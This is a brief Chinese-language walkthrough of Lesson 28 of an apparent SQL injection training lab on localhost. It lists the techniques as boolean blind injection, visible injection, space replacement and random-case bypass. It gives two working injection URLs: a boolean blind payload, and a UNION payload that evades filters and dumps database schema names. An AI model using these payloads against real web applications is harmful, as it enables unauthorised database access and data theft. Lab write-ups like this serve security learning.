# Lesson-28

```
Bool 盲注 , 明注 , 替换空格 , 随机大小写绕过
```

这个Payload基本通杀 : 
```
http://127.0.0.1/Less-28a/?id=0%27%20or()or%20%27%27=%271
直接盲注就行
```
这样也可以明注 : 
```
http://127.0.0.1/Less-28a/?id=0%27)/**/UnION/**/select/**/1,1,group_concat(schema_name)/**/from/**/information_schema.schemata/**/where/**/(%27%27=%27
```
